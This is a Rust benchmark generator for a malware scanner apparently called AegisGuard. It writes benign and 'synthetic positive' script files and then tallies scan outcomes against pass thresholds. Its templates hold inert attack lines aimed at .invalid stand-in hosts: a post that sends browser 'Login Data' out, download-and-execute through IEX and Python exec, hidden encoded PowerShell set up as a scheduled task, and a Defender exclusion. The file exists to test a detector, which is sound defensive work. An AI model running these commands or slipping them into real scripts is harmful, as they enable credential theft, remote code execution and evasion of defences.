//! Deterministic, harmless benchmark corpus for AegisGuard baselines.
//!
//! `cargo run --example bench_corpus -- generate <dir>` writes synthetic files
//! (benign scripts, benign admin-style scripts, structurally valid PE stubs and
//! synthetic positive samples that are inert text). Nothing is ever executed.
//! `cargo run --example bench_corpus -- summarize <scan.jsonl>` prints a Markdown
//! table of outcomes per category, used as the initial false-positive baseline.
use std::collections::BTreeMap;
use std::fs;
use std::path::Path;

const PER_TEMPLATE: usize = 100;

/// (category, extension, template). `{i}` is replaced by the file index.
const TEMPLATES: &[(&str, &str, &str)] = &[
    ("benign", "py", "def add(a, b):\n    return a + b\n\nprint(add({i}, 2))\n"),
    ("benign", "js", "const items = [{i}, 2, 3];\nconsole.log(items.map(x => x * 2));\n"),
    ("benign", "ps1", "Get-ChildItem -Path $env:TEMP | Select-Object -First {i}\n"),
    ("benign", "bat", "@echo off\necho Build step {i}\nexit /b 0\n"),
    (
        "benign_admin",
        "ps1",
        "# Installer helper {i}\n$url = 'https://downloads.example.invalid/tool.msi'\nInvoke-WebRequest -Uri $url -OutFile tool.msi\nStart-Process msiexec.exe -ArgumentList '/i tool.msi /qn' -Wait\n",
    ),
    (
        "benign_admin",
        "ps1",
        "# Nightly maintenance {i}\nRegister-ScheduledTask -TaskName 'Cleanup{i}' -Action (New-ScheduledTaskAction -Execute 'cleanmgr.exe')\n",
    ),
    (
        "benign_admin",
        "py",
        "import subprocess, requests\nr = requests.get('https://api.example.invalid/version/{i}')\nsubprocess.run(['git', 'pull'])\n",
    ),
    (
        "synthetic_positive",
        "py",
        "# inert synthetic sample {i}\nname = 'Login Data'\nrequests.post('https://collector.example.invalid', data=name)\n",
    ),    // Additional benign controls (P5-02): sensitive words only in comments,
    // and ordinary update checks. Never executed.
    (
        "benign_admin_extra",
        "ps1",
        "# Do not use IEX (New-Object Net.WebClient).DownloadString(...) here {i}\n<# Add-MpPreference -ExclusionPath is forbidden by policy #>\nGet-Service -Name wuauserv | Select-Object Status\n",
    ),
    (
        "benign_admin_extra",
        "py",
        "# Update checker {i}: never send 'Login Data' anywhere\nimport requests\nr = requests.get('https://api.example.invalid/latest')\nprint(r.json()['version'])\n",
    ),
    (
        "benign_admin_extra",
        "bat",
        "@echo off\nrem schtasks /create is done by the installer, not here {i}\nxcopy /y config.ini \"%ProgramData%\\Tool\\\"\n",
    ),
    // Additional inert positives (P5-02): fetched content flowing into code
    // execution, risky persistence and defense evasion. Never executed.
    (
        "synthetic_positive_more",
        "ps1",
        "# inert synthetic sample {i}\nIEX (New-Object Net.WebClient).DownloadString('http://payload.example.invalid/{i}')\n",
    ),
    (
        "synthetic_positive_more",
        "py",
        "# inert synthetic sample {i}\nimport requests\ncode = requests.get('http://payload.example.invalid/{i}').text\nstage = code.strip()\nexec(stage)\n",
    ),
    (
        "synthetic_positive_more",
        "ps1",
        "# inert synthetic sample {i}\nRegister-ScheduledTask -TaskName 'U{i}' -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-w hidden -enc AAAA')\nAdd-MpPreference -ExclusionPath $env:APPDATA\n",
    ),
];

fn pe_stub(i: usize) -> Vec<u8> {
    let mut bytes = vec![0u8; 4096];
    bytes[0..2].copy_from_slice(b"MZ");
    bytes[0x3c..0x40].copy_from_slice(&0x80u32.to_le_bytes());
    bytes[0x80..0x84].copy_from_slice(b"PE\0\0");
    bytes[0x86..0x88].copy_from_slice(&1u16.to_le_bytes());
    let section = 0x80 + 4 + 20;
    bytes[section..section + 5].copy_from_slice(b".text");
    bytes[section + 16..section + 20].copy_from_slice(&0x200u32.to_le_bytes());
    bytes[section + 20..section + 24].copy_from_slice(&0x400u32.to_le_bytes());
    // Code + read; not writable.
    bytes[section + 36..section + 40].copy_from_slice(&0x6000_0020u32.to_le_bytes());
    bytes[0x400] = (i % 251) as u8;
    bytes
}

fn generate(dir: &Path) -> std::io::Result<()> {
    fs::create_dir_all(dir)?;
    for (t, (category, ext, template)) in TEMPLATES.iter().enumerate() {
        let sub = dir.join(category);
        fs::create_dir_all(&sub)?;
        for i in 0..PER_TEMPLATE {
            let body = template.replace("{i}", &i.to_string());
            fs::write(sub.join(format!("t{t}_{i}.{ext}")), body)?;
        }
    }
    let pe = dir.join("benign_pe");
    fs::create_dir_all(&pe)?;
    for i in 0..PER_TEMPLATE {
        fs::write(pe.join(format!("stub_{i}.dll")), pe_stub(i))?;
    }
    Ok(())
}

/// Gate checked by `summarize --check` (synthetic corpus only, P5-02): at
/// most this many `benign_admin` reports may reach `review` or `high`.
const MAX_BENIGN_ADMIN_REVIEW: u64 = 15;

fn summarize(jsonl: &Path, check: bool) -> Result<(), Box<dyn std::error::Error>> {
    // category -> risk -> count
    let mut table: BTreeMap<String, BTreeMap<String, u64>> = BTreeMap::new();
    for line in fs::read_to_string(jsonl)?.lines() {
        let report: serde_json::Value = serde_json::from_str(line)?;
        let path = report["path"].as_str().unwrap_or("").replace('\\', "/");
        let category = path.rsplit('/').nth(1).unwrap_or("unknown").to_owned();
        let risk = report["risk"].as_str().unwrap_or("?").to_owned();
        *table.entry(category).or_default().entry(risk).or_default() += 1;
    }
    let risks = ["low_signal", "review", "high", "incomplete", "not_assessed"];
    println!("| category | {} |", risks.join(" | "));
    println!("|---|{}", "---|".repeat(risks.len()));
    for (category, counts) in &table {
        let cells: Vec<String> = risks
            .iter()
            .map(|r| counts.get(*r).copied().unwrap_or(0).to_string())
            .collect();
        println!("| {category} | {} |", cells.join(" | "));
    }
    println!(
        "\nSynthetic corpus only: `benign*` rows above `low_signal` are false-positive candidates; \
         `synthetic_positive*` rows below `review` are misses. Not a real-world detection rate."
    );
    if check {
        let count = |category: &str, risks: &[&str]| -> u64 {
            table.get(category).map_or(0, |c| {
                risks.iter().map(|r| c.get(*r).copied().unwrap_or(0)).sum()
            })
        };
        let mut failures = Vec::new();
        let admin = count("benign_admin", &["review", "high"]);
        if admin > MAX_BENIGN_ADMIN_REVIEW {
            failures.push(format!(
                "benign_admin review/high {admin} > {MAX_BENIGN_ADMIN_REVIEW}"
            ));
        }
        for category in ["benign", "benign_pe", "benign_admin_extra"] {
            let n = count(category, &["review", "high"]);
            if n > 0 {
                failures.push(format!("{category} review/high {n} > 0"));
            }
        }
        for category in ["synthetic_positive", "synthetic_positive_more"] {
            let missed = count(category, &["low_signal", "incomplete", "not_assessed"]);
            let total = count(category, &risks);
            if missed > 0 || total == 0 {
                failures.push(format!("{category}: {missed} of {total} below review"));
            }
        }
        if !failures.is_empty() {
            return Err(failures.join("; ").into());
        }
    }
    Ok(())
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = std::env::args().skip(1).collect();
    match args.as_slice() {
        [cmd, dir] if cmd == "generate" => Ok(generate(Path::new(dir))?),
        [cmd, file] if cmd == "summarize" => summarize(Path::new(file), false),
        [cmd, flag, file] if cmd == "summarize" && flag == "--check" => {
            summarize(Path::new(file), true)
        }
        _ => Err("usage: bench_corpus generate <dir> | summarize [--check] <scan.jsonl>".into()),
    }
}
